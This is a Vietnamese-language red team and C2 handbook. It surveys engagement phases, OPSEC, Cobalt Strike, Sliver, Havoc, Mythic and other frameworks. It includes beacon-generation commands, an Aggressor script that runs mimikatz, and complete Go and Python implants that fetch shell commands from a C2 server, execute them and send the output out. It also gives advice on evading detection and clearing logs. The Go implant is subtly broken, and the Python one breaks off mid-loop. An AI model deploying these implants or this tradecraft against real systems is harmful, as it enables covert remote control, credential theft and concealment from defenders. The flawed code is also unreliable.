# RED TEAM & C2 MASTERY
> Tài liệu tổng hợp kiến thức chuyên sâu về Red Team operations, C2 frameworks, EDR/SIEM evasion, và adversary simulation.
> Biên soạn: Hermes Agent — Nous Research
> Ngôn ngữ: Tiếng Việt (giải thích), English (thuật ngữ kỹ thuật)

---

## MỤC LỤC
- [A. RED TEAM OPERATIONS FRAMEWORK](#a-red-team-operations-framework)
- [B. C2 FRAMEWORKS DEEP-DIVE](#b-c2-frameworks-deep-dive)
- [C. INITIAL ACCESS & PHISHING](#c-initial-access--phishing)
- [D. DEFENSE EVASION — EDR/SIEM/XDR](#d-defense-evasion--edrsiemxdr)
- [E. WINDOWS DEFENSES DEEP-DIVE](#e-windows-defenses-deep-dive)
- [F. POST-EXPLOITATION & LATERAL MOVEMENT](#f-post-exploitation--lateral-movement)
- [G. PERSISTENCE & PRIVILEGE ESCALATION WINDOWS](#g-persistence--privilege-escalation-windows)
- [H. PERSISTENCE & PRIVESC LINUX](#h-persistence--privesc-linux)
- [I. EGRESS & DATA EXFILTRATION](#i-egress--data-exfiltration)
- [J. INFRASTRUCTURE OPSEC](#j-infrastructure-opsec)
- [K. TOOLS MASTERY](#k-tools-mastery)
- [L. RED TEAM CERTIFICATIONS & TRAINING](#l-red-team-certifications--training)
- [M. TOP RESOURCES](#m-top-resources)
- [N. KEY INSIGHTS](#n-key-insights)

---

## A. RED TEAM OPERATIONS FRAMEWORK

### 1. Red Team vs Pentest vs Bug Bounty — Sự Khác Biệt Chiến Lược

**Pentest (Penetration Test):**
- Mục tiêu: Tìm càng nhiều lỗ hổng càng tốt trong một phạm vi thời gian giới hạn.
- Phạm vi: Rõ ràng, được xác định trước (IP range, ứng dụng, API).
- Báo cáo: Liệt kê chi tiết các vulnerability kèm CVSS score, proof-of-concept, remediation recommendation.
- Tần suất: Thường 1-2 lần/năm hoặc theo yêu cầu compliance (PCI-DSS, SOC2, ISO 27001).
- Phương pháp: Có thể sử dụng authenticated scan, được cung cấp credentials.

**Red Team Engagement:**
- Mục tiêu: Đánh giá khả năng phát hiện và phản ứng (detection & response) của tổ chức — không chỉ tìm lỗi.
- Phạm vi: Mục tiêu cụ thể (flag, data, critical system), không giới hạn kỹ thuật.
- Phương thức: Adversary simulation — mô phỏng TTPs (Tactics, Techniques, Procedures) của real threat actor.
- Báo cáo: Tập trung vào gaps trong people/process/technology, recommendations để cải thiện detection.
- Đặc thù: Có thể bao gồm physical breach, social engineering, phishing campaigns kéo dài nhiều tuần.
- Deconfliction: Cần kênh liên lạc với blue team để tránh "friendly fire".

**Bug Bounty:**
- Mục tiêu: Crowdsourced security testing, trả tiền theo từng lỗi tìm được.
- Phạm vi: Giới hạn bởi chương trình bounty (thường chỉ web/mobile apps).
- Phương pháp: Tự do, không có phối hợp, researcher độc lập.
- Báo cáo: Chi tiết từng bug riêng lẻ, kèm proof-of-concept.
- Khác biệt chính: Không có adversarial simulation, không test physical, không social engineering.

### 2. Engagement Lifecycle — Chi Tiết Các Giai Đoạn

Một Red Team engagement điển hình trải qua 7 giai đoạn theo chuẩn PTES (Penetration Testing Execution Standard) mở rộng:

#### Phase 1: Reconnaissance (Recon)
- **OSINT (Open Source Intelligence):** Thu thập thông tin từ LinkedIn, Github, Shodan, Censys, Google dorking, theHarvester, Maltego.
- **Domain & Subdomain Enumeration:** Amass, Sublist3r, Subfinder, DNS bruteforce, Certificate Transparency logs (crt.sh).
- **Technology Fingerprinting:** Wappalyzer, WhatWeb, BuiltWith — xác định stack công nghệ.
- **Social Media Recon:** Twitter, Reddit, Facebook — thu thập thông tin nhân viên, nội bộ.
- **Dark Web Intelligence:** Tìm kiếm credentials bị rò rỉ, internal documents bị leak.
- **Physical Recon:** Địa điểm văn phòng, badge system, camera layout, trash diving (nếu trong phạm vi).

#### Phase 2: Initial Access
- **Phishing:** Email spear-phishing, whaling (CEO fraud), vishing (voice), smishing (SMS).
- **Web Exploitation:** SQLi, RCE, SSRF, file upload vulnerabilities.
- **Supply Chain Attack:** Compromise third-party vendor software, update server.
- **Physical Access:** Badge cloning, tailgating, lock picking.
- **Watering Hole:** Compromise website mục tiêu thường truy cập.
- **Drive-by Download:** Exploit browser vulnerabilities qua compromised sites.

#### Phase 3: Command & Control (C2)
- **Beacon Deployment:** Cài đặt implant trên target machine.
- **Listener Configuration:** Thiết lập C2 server nhận kết nối.
- **Traffic Obfuscation:** Malleable C2 profiles, domain fronting, CDN redirectors.
- **Sleep & Jitter:** Beacon call-home pattern để tránh detection.
- **Domain Rotation:** DGA (Domain Generation Algorithm) hoặc pre-configured fallback domains.

#### Phase 4: Lateral Movement
- **Credential Dumping:** Mimikatz, LSASS dumping, SAM registry, DPAPI.
- **Pass-the-Hash / Pass-the-Ticket:** Sử dụng harvested credentials để di chuyển.
- **Remote Execution:** PsExec, WMI, WinRM, SchTasks, DCOM, SCCM.
- **Kerberos Attacks:** Kerberoasting, AS-REP Roasting, Golden/Silver Ticket, Skeleton Key.
- **Token Manipulation:** Steal token, make token, impersonation.
- **Overpass-the-Hash:** Chuyển NTLM hash thành Kerberos TGT.

#### Phase 5: Persistence
- **Windows Persistence:** Registry run keys, scheduled tasks, WMI event subscription, services, COM hijacking, DLL search order hijacking, bootkit.
- **Linux Persistence:** Cron, systemd, SSH authorized_keys, LD_PRELOAD, kernel module, PAM backdoor.
- **Web Shell:** ASPX, PHP, JSP shells trên web servers.
- **Backdoor Accounts:** Create hidden local/domain users.
- **Skeleton Key:** Mimikatz skeleton key trên domain controller.

#### Phase 6: Exfiltration
- **Data Staging:** Thu thập, nén, mã hóa dữ liệu trước khi gửi ra ngoài.
- **C2 Channel Exfil:** Gửi dữ liệu qua beacon C2 chính.
- **Alternate Protocol:** DNS tunneling, HTTPS, ICMP, SMTP.
- **Cloud Exfiltration:** S3, Azure Blob, Google Drive, Dropbox API.
- **Physical Exfil:** USB, smartphone camera, in ấn tài liệu.

#### Phase 7: Reporting & Debrief
- **Executive Summary:** Dành cho C-level, tập trung vào business risk.
- **Technical Report:** Chi tiết kỹ thuật, từng bước thực hiện, screenshots.
- **Detection Gap Analysis:** So sánh giữa attack steps và detections của blue team.
- **Remediation Roadmap:** Ưu tiên các khuyến nghị theo mức độ nghiêm trọng.
- **Purple Team Workshop:** Trình bày findings, cùng thảo luận cách cải thiện.

### 3. Rules of Engagement (RoE) — Khuôn Khổ Pháp Lý

RoE là tài liệu pháp lý quan trọng nhất trước khi bắt đầu bất kỳ engagement nào. Các thành phần chính:

1. **Scope (Phạm vi):**
   - IP ranges, domain names, ứng dụng được phép test.
   - Danh sách loại trừ (exclusion list): production-critical systems, third-party environments.
   - Thời gian test: giờ hành chính, ngoài giờ, weekend.

2. **Authorization (Ủy quyền):**
   - Signed statement of work (SoW) từ người có thẩm quyền (CISO, VP of Engineering).
   - Insurance requirements: professional liability, cyber insurance.
   - Third-party authorization nếu test environment của vendor.

3. **Rules & Constraints:**
   - Không được phép: DoS, DDoS, social engineering vượt quá giới hạn, physical breach nếu không có trong scope.
   - Critical systems: read-only access, không được modify data.
   - Data handling: mã hóa dữ liệu thu thập, xóa sau engagement.

4. **Communication (Liên lạc):**
   - Emergency contact: ai gọi khi phát hiện incident thật?
   - Deconfliction: làm sao để phân biệt red team activity và real attack?
   - Reporting schedule: daily standup, weekly update, final report deadline.

5. **Rules of Engagement cho Physical Penetration Testing:**
   - Không được phép gây hư hại tài sản.
   - Không được tương tác với nhân viên không có trong kế hoạch.
   - Phải có emergency contact để xác nhận danh tính nếu bị bắt.
   - Thời gian test physical thường ngoài giờ làm việc.

### 4. OPSEC Fundamentals — Nguyên Tắc Vàng

**What is OPSEC (Operational Security)?**
OPSEC là quá trình xác định và bảo vệ thông tin nhạy cảm khỏi bị lộ ra ngoài, đặc biệt là thông tin về chiến dịch, infrastructure, và TTPs.

**Nguyên tắc OPSEC cốt lõi:**

1. **Compartmentalization:** Chia nhỏ thông tin — mỗi người chỉ biết phần mình cần.
   - C2 operators không biết phishing infrastructure.
   - Mỗi C2 server dùng riêng cho từng client.
   - Không dùng chung VPS, domain, SSL cert giữa các engagements.

2. **Need-to-Know Basis:** Chỉ chia sẻ thông tin khi thực sự cần thiết.

3. **Cover for Action:** Tạo bề ngoài hợp lý cho hoạt động.
   - Redirector giả làm CDN, API gateway, hoặc website hợp pháp.
   - Email phishing giả làm notification từ legitimate service.

4. **Low-and-Slow:** Tránh hành động gây chú ý.
   - Beacon check-in thưa (4-8 giờ), jitter ngẫu nhiên.
   - Không scan ồ ạt, không bruteforce.
   - Dùng sleep mask khi beacon không hoạt động.

5. **Burn Notice:** Khi infrastructure bị phát hiện:
   - Ngay lập tức tear down compromised C2 server.
   - Rotate tất cả domain, IP, SSL certs.
   - Phân tích forensic để hiểu "how burned".

6. **Cleanup:** Sau engagement:
   - Gỡ bỏ tất cả persistence, backdoor, tools.
   - Xóa logs, event logs đã tạo.
   - Ngừng VPS, hủy domain, thu hồi SSL certs.

### 5. OpSec Tradecraft — Kỹ Thuật Vận Hành

**C2 Infrastructure OpSec:**
- **Redirector Chain:** Client → CDN (Cloudflare) → Redirector (Nginx) → C2 Server → Teamserver.
- **Domain Strategy:** Domain đăng ký qua registrar anonymity (Njalla, Porkbun với WHOIS privacy). Tuổi đời domain > 1 năm tránh reputation blacklist.
- **SSL Certificates:** Let's Encrypt certs rotation tự động. Certs từ normal CA (DigiCert, GoDaddy) ít bị threat intel tracking hơn.
- **Cloud Provider Strategy:** Dùng nhiều provider (Hetzner, DigitalOcean, Vultr, AWS) để tránh mass takedown. Mỗi region/biz khác nhau.

**Phishing Infrastructure OpSec:**
- **Domain Isolation:** Mỗi campaign dùng domain riêng. Không dùng lại domain đã từng bị block.
- **Email Warm-up:** Domain mới cần warm up trước (gửi email hợp lệ vài tuần) tránh spam filter.
- **Sending Diversity:** Dùng nhiều SMTP relay, không dùng chung IP reputation.
- **Landing Page:** Clone legitimate login page nhưng có tracking. Dùng Let's Encrypt cert cho HTTPS.

**Lateral Movement OpSec:**
- **Jump Box / Pivot Host:** Không di chuyển trực tiếp từ C2 beacon đến target cuối. Dùng intermediate hosts.
- **Connection Count:** Hạn chế số lượng kết nối đồng thời. Mỗi beacon tạo kết nối riêng lẻ.
- **Clean Up Lateral Artifacts:** Xóa services, scheduled tasks, WMI objects sau khi dùng.
- **Log Manipulation:** Clear relevant Event Logs sau khi hoàn tất lateral movement.

**Personal OPSEC:**
- **VM Segmentation:** Mỗi engagement dùng VM riêng. Không dùng host machine cho red team activities.
- **VPN + Proxy:** Dùng VPN khi truy cập C2 dashboard. Không dùng personal connection.
- **Burner Accounts:** Email, domain, cloud accounts — tạo mới cho mỗi engagement, hủy sau khi xong.
- **Communication Encryption:** Signal/Matrix cho team communication. PGP cho email.

---

## B. C2 FRAMEWORKS DEEP-DIVE

### 1. Cobalt Strike — "The Gold Standard"

Cobalt Strike là commercial C2 framework phổ biến nhất trong red team community. Được phát triển bởi Fortra (trước đây là Raphael Mudge's Strategic Cyber LLC).

#### Teamserver Architecture

**Teamserver** là central server, thường chạy trên Linux. Nó quản lý:
- **Listener:** HTTP/HTTPS/DNS/SMB — nhận beacon callbacks.
- **Beacons:** Các implants đang hoạt động.
- **Targets & Credentials:** Database của campaign.
- **Logging & Reporting:** Tất cả activity đều log lại.
- **Collaboration:** Multiple operators có thể kết nối qua Cobalt Strike client (Java GUI).

**Client-Server Model:**
- Operators dùng Cobalt Strike client (Windows/Linux Java app).
- Client kết nối đến teamserver qua SSL.
- Teamserver có thể chạy trên Linux/Windows.
- Mutable C2 profile quyết định hành vi network của beacon.

#### Listeners — Phân Tích Chi Tiết

**1. HTTP/HTTPS Listener:**
- **Default behavior:** Beacon giao tiếp qua HTTP GET/POST.
- **Metadata URI:** GET request gửi metadata lên C2.
- **Task URI:** POST request nhận tasks.
- **Malleable C2 profile:** Tùy chỉnh URI path, headers, User-Agent, cookies, data transforms.
- **Jitter:** Random delay giữa các check-in (ví dụ: 60000 + jitter 20% → 48-72s).
- **Proxy-Aware:** Tự động dùng Windows proxy settings.

```
[Profile: amazon.profile]
GET /apn/v1/ultralight HTTP/1.1
Host: ec2.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Cookie: session=...;
```

**2. DNS Listener:**
- **Mode:** TXT queries cho data exfil, A/AAAA cho tasking.
- **DNS Beacon:** Có thể sleep lâu (60s+) — ít bị phát hiện hơn HTTP.
- **DNS Stager:** Multi-stage payload delivery qua DNS.
- **Subdomain:** Mỗi beacon dùng subdomain riêng.
- **Challenges:** Slow data rate, dễ bị DNS sinkhole.

**3. SMB Listener:**
- **P2P (Peer-to-Peer):** Beacons giao tiếp qua named pipes.
- **Use case:** Air-gapped networks, không có outbound connectivity.
- **SMB Beacon:** Dùng \.pipe\ naming convention.
- **Advantage:** Hoàn toàn transparent với network monitoring.

**4. TCP Listener:**
- **P2P:** Giao tiếp qua TCP sockets.
- **Bind vs Reverse:** Bind listener cho targets không thể outbound.
- **Use case:** Kết hợp với SMB cho layered C2.

#### Malleable C2 — Ngôn Ngữ Cấu Hình Network

Malleable C2 profile là file cấu hình dạng text quyết định:
- **HTTP Request/Response:** Headers, URI endpoints, parameters, cookies.
- **Data Transforms:** Base64, gzip, mask, netbios, print — encode/decode dữ liệu giao tiếp.
- **Metadata Encoding:** Cách beacon gửi metadata về C2.
- **Sleep Mask:** Kỹ thuật obfuscate beacon trong memory khi sleep.
- **Process Inject:** Cách beacon inject vào process khác.

**Cấu trúc profile cơ bản:**

```c
http-get {
    set uri "/search";
    set verb "GET";
    client {
        header "Host" "www.google.com";
        header "Accept" "text/html,application/xhtml+xml";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Server" "Apache/2.4.41";
        output {
            mask;
            base64url;
            print;
        }
    }
}

http-stager {
    set uri_x86 "/api/v1/update";
    set uri_x64 "/api/v1/update64";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17408";
    set transform-x86 "start xxxxx...";
    set transform-x64 "start xxxxx...";
}

sleep_mask {
    set mask "true";
}
```

**Transform Block Operations:**
- `base64` / `base64url` — Mã hóa base64
- `gzip` — Nén
- `netbios` / `netbiosu` — NetBIOS encoding
- `mask` — XOR với key ngẫu nhiên
- `prepend` / `append` — Thêm prefix/suffix

#### Beacon Object Files (BOFs)

BOF là C compiled objects (`.o`) có thể chạy in-memory trong beacon process. Đây là cơ chế mở rộng Cobalt Strike mạnh mẽ.

**BOF Anatomy:**
- `go()` function — entry point, tương tự `main()`.
- `DECLSPEC_IMPORT` — import Windows API functions inline.
- Sử dụng C/C compiler (MinGW, Visual Studio).

**BOF Execution:**
1. Teamserver gửi BOF binary đến beacon.
2. Beacon parse COFF (Common Object File Format).
3. Các function và data relocate vào beacon memory.
4. Execute và gửi output về teamserver.

**BOF vs Aggressor Script:**
- BOF: Native code, chạy in-memory, không touch disk, khó detect.
- Aggressor: Java-based scripting, chạy trên teamserver, dùng cho UI/logic, không phải execution.

**Popular BOFs:**
- `execute-assembly` — Chạy .NET assembly in-memory
- `keylog` — Keylogging
- `screenshot` — Chụp màn hình
- `netview` — Network enumeration
- `sharpview` — Alternative to PowerView
- `saferun` — Evade hooks bằng direct syscalls

#### Aggressor Scripts — Mở Rộng UI & Logic

Aggressor script là ngôn ngữ script dạng C-like (Sleep - Java-based) để customize Cobalt Strike:

**Common Uses:**
- **Log Aggregation:** Collect và hiển thị log theo format tùy chỉnh.
- **Automated Actions:** Tự động import targets, credentials.
- **Custom Dialogs:** Tạo menu tùy chỉnh cho operators.
- **BOF Integration:** Load và execute BOF files.
- **Event Hooks:** `on beacon_initial`, `on beacon_checkin`, `on keystroke`.

**Ví dụ Aggressor Script:**

```java
# Tự động checkin khi có beacon mới
on beacon_initial {
  blog($1, "New beacon infected: " . beacon_info($1, "computer"));
  btask($1, "Auto-executing commands...");
  beacon_run($1, "whoami");
  beacon_run($1, "ipconfig /all");
}

# Custom menu item
popup beacon_bottom {
  item "&Run PowerView" {
    btask($1, "Loading PowerView...");
    beacon_load_ps1($1, "powerview.ps1");
  }
  separator;
  item "&Dump Hash (Safe)" {
    btask($1, "Dumping hashes...");
    beacon_run($1, "mimikatz sekurlsa::logonpasswords");
  }
}
```

#### Pivot Listeners — C2 Trên Air-Gapped Networks

**Pivot Listener** cho phép C2 traffic đi qua beacon khác thay vì direct connection đến teamserver.

**Các kiểu pivot:**
- **SMB Pivot:** Beacon A kết nối đến teamserver. Beacon B kết nối đến Beacon A qua SMB named pipe.
- **TCP Pivot:** Beacon B kết nối đến Beacon A qua TCP.
- **Reverse Port Forward:** Forward port từ beacon đến target nội bộ.

**Use Case:**
```
[Target] ←SMB→ [Jump Box] ←HTTPS→ [Redirector] ←→ [Teamserver]
```
Target không có outbound internet, beacon SMB kết nối đến jump box, jump box có HTTPS beacon kết nối ra C2.

### 2. Sliver — Open Source Alternative

**Sliver** là open source C2 framework do BishopFox phát triển (Go language). Đây là alternative phổ biến nhất cho Cobalt Strike.

#### Architecture

```
[Server (CLI)] ←gRPC→ [Sliver Server Daemon] ←mtls/http/dns→ [Implant]
                    ↑
               [Operators via Sliver CLI]
```

- **Multi-player mode:** Nhiều operators kết nối qua gRPC.
- **Server-side:** Chạy trên Linux, macOS, Windows (daemon).
- **Implant:** Cross-platform (Windows, Linux, macOS, FreeBSD).

#### Operators & Configuration

**Operator Management:**
```bash
# Create new operator
operators --add lacia

# Start server
sliver-server

# Multi-player mode
sliver-server daemon --daemon --lhost 0.0.0.0 --lport 31337
```

#### Implants — Chi Tiết

**Implant Types:**
1. **HTTP/HTTPS:** Flexible, dùng HTTP cho C2 communication.
2. **DNS:** TXT query based, slow but stealthy.
3. **mTLS:** Mutual TLS — hai chiều xác thực certificate.
4. **WireGuard:** Direct peer-to-peer connection.
5. **Named Pipe (P2P):** Tương tự SMB beacon của CS.

**Session vs Beacon Mode:**
- **Session mode:** Interactive shell — real-time, dễ bị phát hiện.
- **Beacon mode:** Check-in periodically — stealthy, tương tự Cobalt Strike beacon.

```
[server] sliver > generate beacon --mtls 192.168.1.100:443 --save beacon.exe
[*] Generating new windows/amd64 beacon implant binary
[*] Build completed: beacon.exe
```

#### Profiles — Tái Sử Dụng Cấu Hình

**Profile là template để generate implants:**

```bash
# Create profile
profiles new --http 1.2.3.4:80 --format service --skip-symbols http-profile

# Generate từ profile
generate --profile http-profile --save payload.exe

# List profiles
profiles
```

**Profile options:**
- `--format`: service (default), exe, shared (DLL), shellcode, sRDI
- `--skip-symbols`: Loại bỏ PDB symbols, harder to analyze
- `--limit-paths`: Limit số path endpoints cho HTTP beacon
- `--key-exchange`: Dùng key exchange thay vì TLS
- `--max-errors`: Max errors trước khi beacon abort

#### Armory — Plugin Ecosystem

**Armory** là package manager cho Sliver extensions:

```bash
# List armory packages
armory

# Install extension
armory install rubeus
armory install seatbelt
armory install sharpview

# Execute installed extension
execute-assembly rubeus kerberoast
```

**Popular Armory Extensions:**
- **Rubeus:** Kerberos interaction toolkit
- **Seatbelt:** Security-oriented host enumeration
- **SharpView:** .NET port of PowerView
- **SafetyKatz:** Safe Mimikatz wrapper
- **SharpUp:** Privilege escalation checks
- **Certify:** ADCS abuse

#### Staging — Staged vs Stageless Payload

**Stageless (default):** Single binary chứa đầy đủ C2 logic → lớn hơn (~5-10MB) nhưng không cần network call để load stage 2.

**Staged:** Small stager (~1KB) + Stage 2 (shellcode), stager sẽ download/décrypt và execute stage 2. Dùng khi cần size nhỏ.

```bash
# Staged payload
generate stager --lhost 1.2.3.4 --lport 443 --protocol http --save stager.bin

# Stageless payload
generate --http 1.2.3.4:443 --save beacon.exe
```

**Staging protocol:** Dùng DNS, HTTP, HTTPS, hoặc raw TCP để deliver stage 2.

### 3. Havoc — Modern, C++ Implant

**Havoc** là C2 framework tương đối mới, viết bằng C++ cho implant và Go cho teamserver. Được thiết kế với focus mạnh vào evasion.

#### Demon Implant

**Demon** là implant của Havoc, hoàn toàn viết bằng C++. Các đặc điểm nổi bật:

- **Direct Syscalls:** Dùng Hell's Gate / Halo's Gate để bypass userland hooks.
- **Sleep Obfuscation:** Tương tự Ekko technique — mã hóa beacon memory khi sleep, decrypt khi wake.
- **Inline Hooking Detection:** Tự động phát hiện ntdll.dll hooks.
- **ETW Patching:** Patching Event Tracing for Windows.
- **AMSI Patching:** Patching Antimalware Scan Interface.
- **PE Header Manipulation:** Xóa PE headers trong memory.
- **Stack Spoofing:** Xóa call stack traces khi thực thi.

#### Listeners

**HTTP/HTTPS Listener:**
- Customizable Agent (User-Agent, headers).
- AES-encrypted communication.
- Support GET/POST methods.
- Configurable sleep and jitter.

**SMB Listener (P2P):**
- Giao tiếp qua named pipes giữa các agents.
- Dùng cho internal networks.

**External Listener:**
- Kết nối với external C2 infrastructure.

#### Payload Generation

```
Payload Type: Shellcode, EXE, DLL, Service EXE
Architecture: x86, x64, x86_64
Techniques: 
  - Direct syscalls (Hell's Gate / Halo's Gate)
  - Indirect syscalls
  - SysWhispers3
  - Win32 API (fallback)
Sleep Technique:
  - None
  - Ekko (timers)
  - WaitForSingleObject
```

### 4. Mythic — Multi-Agent C2

**Mythic** là C2 framework mã nguồn mở với multi-agent support, do Cody Thomas (its_a_thing) phát triển.

#### Architecture

```
[Browser (Web UI)] → [Mythic Server (Python/Docker)] ←C2 Profile→ [Agent]
                           ↑
                   [REST API / gRPC]
```

**Components:**
- **Mythic Server:** Central server (Docker-based), quản lý operators, agents, tasks, downloads.
- **Web UI:** React-based dashboard.
- **C2 Profile:** Giao thức giao tiếp giữa server và agent (HTTP, DNS, SMB, WebSocket).
- **Payload Type:** Định nghĩa agent type — và cách agent được build.

#### Agents

**Apollo (C# .NET):**
- Dùng .NET Framework (.NET 4.0+).
- Chạy in-memory, compile-on-target.
- Integrate với various .NET tooling.

**Poseidon (C/C++ implant):**
- Cross-platform (Windows, Linux, macOS).
- Native code execution.
- Tương tự Cobalt Strike beacon.

**Atlas (Go):**
- Multi-platform (Windows, Linux, macOS).
- Go-based, static binary.
- Dùng cho container environments.

**Mythic built-in capabilities:**
- `execute_assembly`: Chạy .NET assembly in-memory.
- `inject_shellcode`: Inject shellcode vào process.
- `keylog`: Keylogging.
- `screenshot`: Screen capture.
- `hashdump`: Dump local SAM hashes.
- `tokens`: Token manipulation.

#### Payload Generation — Build Process

Mythic dùng Docker containers để build payloads:

1. Operator chọn Payload Type (Apollo, Poseidon, Atlas).
2. Chọn C2 Profile (HTTP, DNS, SMB).
3. Configure options (sleep, jitter, obfuscation).
4. Server gọi Docker container build agent binary.
5. Agent binary được sign và deliver.

### 5. Nighthawk — Evasion-Focused C2

**Nighthawk** là C2 framework thương mại từ MDSec, được thiết kế với singular focus là evasion.

#### Key Features

- **Custom Shellcode Execution:** Không dùng CreateRemoteThread thông thường.
- **Advanced Sleep Obfuscation:** Mã hóa toàn bộ beacon memory khi sleep.
- **Indirect Syscalls:** Tất cả system calls đều indirect, không qua ntdll.
- **Module Stomping:** Overwrite hợp pháp DLL với beacon code (tương tự Module Stomping technique).
- **Callback Hell:** Dùng nhiều callback functions thay vì thread creation.
- **Hardware Breakpoints Protection:** Phát hiện memory scan/read attempts.
- **Non-Emulation:** Anti-sandbox, anti-emulation checks.

#### Evasion Architecture

```
┌──────────────────┐
│  Nighthawk Agent │
├──────────────────┤
│ Sleep Obfuscation│ → Full memory encryption during sleep
│ Indirect Syscalls│ → Không traceable qua ntdll.dll
│ Module Stomping  │ → Code ẩn trong legitimate DLL memory
│ Callback Hell    │ → No threads, chỉ dùng callbacks
│ ETW/AMSI Patch   │ → Patching defenders
└──────────────────┘
```

### 6. Brute Ratel C4 — Anti-Analysis C2

**Brute Ratel C4** (BRC4) là commercial C2 framework với focus mạnh vào evading analysis và detection.

**Key Concepts:**
- **Badger:** Implant tương tự beacon.
- **Commander:** C2 server UI.
- **Pandora:** Payload builder.
- **Custom Encoding:** Không dùng base64/base58 thông thường.
- **Environmental Keying:** Payload chỉ hoạt động trên target environment cụ thể.
- **Anti-Debug, Anti-VM, Anti-Sandbox tích hợp sẵn.**

**Controversy:**
BRC4 từng bị tranh cãi vì bị leak, dẫn đến việc các nhóm ransomware (LockBit, BlackCat) sử dụng nó. Tuy nhiên đây vẫn là công cụ mạnh cho red team.

### 7. Empire & Starkiller — PowerShell Empire

**Empire** (PowerShell Empire / BC-SECURITY Empire) là post-exploitation framework dùng PowerShell.

**Status:** Đã ngừng phát triển bản gốc. BC-SECURITY fork tiếp tục phát triển.

**Key Modules:**
- **Recon:** `powerview` integration, bloodhound, situational awareness.
- **Credential:** Mimikatz integration, hashdump, token manipulation.
- **Lateral:** Invoke-PSExec, Invoke-WMI, Invoke-SSHCommand.
- **Exfiltration:** Email, FTP, DNS.
- **PrivEsc:** PowerUp integration, GPP password, service abuser.
- **Persistence:** Registry, scheduled tasks, WMI, COM.

**Starkiller:** Web UI cho Empire (Vue.js frontend).

**Agents:**
- **HTTP/HTTPS:** Agent giao tiếp qua HTTP.
- **DNS:** Agent giao tiếp qua DNS TXT queries.
- **SMB:** Agent giao tiếp qua named pipes.

**Limitations:**
- PowerShell-based → dễ bị AMSI, WDAC, PowerShell Constrained Language mode block.
- Cần obfuscation nặng để bypass modern Windows defenses.
- Không còn được maintain tích cực bởi team gốc.

### 8. Covenant — .NET C2

**Covenant** là .NET C2 framework, phát triển bởi Ryan Cobb (cobbr).

**Key Features:**
- **Dynamic Compilation:** C# code compile on-the-fly.
- **Multiple Listener Types:** HTTP, HTTPS, Bridge (Bridge listener redirects traffic).
- **Grunt:** .NET implant (tương tự beacon).
- **Launchers:** Binary, PowerShell, MSBuild, VBS, WMI, scriptlet.
- **Tasking:** Readable task output, không encoded.

**Strengths:**
- .NET native — easy integration với .NET tooling (Rubeus, Seatbelt, SharpHound).
- UI web-based, dễ sử dụng.
- Open source.

**Weaknesses:**
- .NET detection ngày càng cao.
- Cần obfuscation (ConfuserEx, Obfuscar) để tránh AV signature.
- Không có built-in advanced evasion (direct syscalls, sleep mask).

### 9. Custom C2 — Tự Xây Dựng Implant

Đôi khi framework có sẵn không đáp ứng được yêu cầu OPSEC hoặc cần custom behavior. Tự viết C2 implant là kỹ năng quan trọng cho red teamer advanced.

#### Simple Golang Implant

```go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net/http"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

type Task struct {
    ID      string `json:"id"`
    Command string `json:"command"`
}

type Result struct {
    ID     string `json:"id"`
    Output string `json:"output"`
    Host   string `json:"host"`
    User   string `json:"user"`
}

var (
    key = []byte("AES256Key-32CharLongForAES256!!")
    c2URL = "https://example.com/api/v1"
)

func decrypt(ct string) []byte {
    data, _ := base64.StdEncoding.DecodeString(ct)
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonce := data[:gcm.NonceSize()]
    ciphertext := data[gcm.NonceSize():]
    plain, _ := gcm.Open(nil, nonce, ciphertext, nil)
    return plain
}

func encrypt(plain []byte) string {
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    // crypto/rand.Read(nonce)
    ciphertext := gcm.Seal(nonce, nonce, plain, nil)
    return base64.StdEncoding.EncodeToString(ciphertext)
}

func execute(cmd string) string {
    var shell string
    if runtime.GOOS == "windows" {
        shell = "cmd"
    } else {
        shell = "/bin/sh"
    }
    out, err := exec.Command(shell, "/c", cmd).Output()
    if err != nil {
        return fmt.Sprintf("Error: %v", err)
    }
    return string(out)
}

func main() {
    host, _ := os.Hostname()
    user := strings.ReplaceAll(execute("whoami"), "\n", "")
    
    for {
        // GET task
        resp, err := http.Get(c2URL + "/tasks")
        if err != nil {
            time.Sleep(60 * time.Second)
            continue
        }
        body, _ := ioutil.ReadAll(resp.Body)
        resp.Body.Close()
        
        task := Task{}
        json.Unmarshal(decrypt(string(body)), &task)
        
        if task.Command != "" {
            output := execute(task.Command)
            result := Result{ID: task.ID, Output: output, Host: host, User: user}
            data, _ := json.Marshal(result)
            http.Post(c2URL+"/results", "application/json", 
                strings.NewReader(encrypt(data)))
        }
        
        time.Sleep(60 * time.Second) // Sleep + jitter
    }
}
```

#### Simple Python Implant

```python
#!/usr/bin/env python3
import base64, json, os, subprocess, requests, time, random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'SixteenByteKey!!'
C2_URL = "https://example.com/api"
SLEEP = 60
JITTER = 20

def decrypt(ct):
    data = base64.b64decode(ct)
    iv, ciphertext = data[:16], data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), 16).decode()

def encrypt(plain):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plain.encode(), 16))
    return base64.b64encode(iv + ct).decode()

def execute(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8', errors='ignore')
    except Exception as e:
        return str(e)

def beacon():
    hostname = os.uname()[1]
    user = execute('whoami').strip()
    
    while True:
        try:
            # Check-in
            payload = json.dumps({"host": hostname, "user": user})
            r = requests.get(f"{C2_URL}/checkin", 
                           headers={"X-Session": encrypt(payload)},
                           verify=False)
            
            if r.status_code == 200:
                task = decrypt(r.text)
                task_data = json.loads(task)
                
                if task_data.get("cmd"):
                    output = execute(task_data["cmd"])
                    result = {"id": task_data["id"], "output": output}
                    requests.post(f"{C2_URL}/result",
                                data=encrypt(json.dumps(result)),
                                verify=False)
        except Exception as e:
            pass
        
        sleep_time = SLEEP + random.randint(0, JITTER)
